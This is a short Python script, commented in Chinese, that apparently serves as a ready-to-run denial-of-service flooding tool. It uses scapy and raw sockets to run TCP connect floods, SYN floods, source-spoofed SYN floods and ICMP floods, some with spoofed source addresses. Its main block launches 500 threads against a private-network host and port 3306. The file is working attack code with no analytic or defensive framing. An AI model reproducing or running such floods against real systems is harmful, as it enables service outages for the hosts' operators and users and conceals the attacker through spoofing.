import socket,scapy,random,threading

from scapy.layers.inet import IP, TCP, ICMP
from scapy.sendrecv import sr1
'''
该代码用于各式泛洪攻击
'''

#192.168.161.135
def tcplianjie(ip,port):
    while True:
        try:
            s=socket.socket()
            s.connect((ip,port))
        except:
            pass

def tcpbanlianjie(ip,port1):
    while True:
        try:
            port=random.randint(10000,65535)
            data=IP(dst=ip)/TCP(sport=port,dport=port1,flags='S')
            sr1(data,timeout=1,verbose=0)
        except:
            pass
def tcpqipain(attip,ip,port1):
    while True:
        try:
            port = random.randint(10000, 65535)
            data = IP(src=attip,dst=ip) / TCP(sport=port, dport=port1, flags='S')
            sr1(data, timeout=1, verbose=0)
        except:
            pass
def icmp(ip):
    while True:
        try:
            info="hello hack"*50
            data=IP(dst=ip)/ICMP()/info
            sr1(data,timeout=1,verbose=0)
        except:
            pass
def icmpqipian(ip):
    while True:
        try:
            info = "hello hack" * 50
            data = IP(src="192.168.161.135",dst=ip) / ICMP() / info
            sr1(data, timeout=1, verbose=0)
        except:
            pass

if __name__ == '__main__':
    for i in range(500):
        #threading.Thread(target=tcplianjie,args=("192.168.161.139",3306)).start()
        #threading.Thread(target=tcpbanlianjie, args=("192.168.161.139", 3306)).start()
        #threading.Thread(target=tcpqipain, args=("192.168.161.135","192.168.161.139", 3306)).start()
        #threading.Thread(target=icmp, args=("192.168.161.139",)).start()
        threading.Thread(target=icmpqipian, args=("192.168.161.139",)).start()
